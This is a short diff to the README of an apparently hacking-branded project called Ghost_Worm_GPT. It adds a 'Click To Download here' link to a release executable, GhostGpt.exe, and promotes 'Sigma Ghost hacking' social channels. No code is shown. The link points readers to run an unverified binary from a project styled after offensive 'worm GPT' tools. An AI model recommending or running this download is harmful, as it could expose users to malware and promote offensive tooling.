@@ -23,6 +23,8 @@ It features a lock-screen authentication system, a dark-themed terminal UI, and 
 
 <img width="1001" height="778" alt="image" src="https://github.com/user-attachments/assets/bc6dfa98-b4a7-466b-84d5-ae25c53e8579" />
 
+[Click To Download here](https://github.com/cyber-ghost-hacking/Ghost_Worm_GPT/releases/download/%23GhostGPT/GhostGpt.exe)
+
 ## 🌐 Connect With Us
 
 [![Telegram](https://img.shields.io/badge/Telegram-Sigma_Ghost-blue?logo=telegram)](https://t.me/Sigma_Cyber_Ghost)  [![YouTube](https://img.shields.io/badge/YouTube-Sigma_Ghost-red?logo=youtube)](https://www.youtube.com/@sigma_ghost_hacking)  [![Instagram](https://img.shields.io/badge/Instagram-Safder_Khan-purple?logo=instagram)](https://www.instagram.com/safderkhan0800_/)  [![Twitter](https://img.shields.io/badge/Twitter-@safderkhan0800_-1DA1F2?logo=twitter)](https://twitter.com/safderkhan0800_)[![YouTube](https://img.shields.io/badge/YouTube-Sigma_Ghost-red?logo=youtube)](https://www.youtube.com/@Sigma-Cyber-Ghost) 
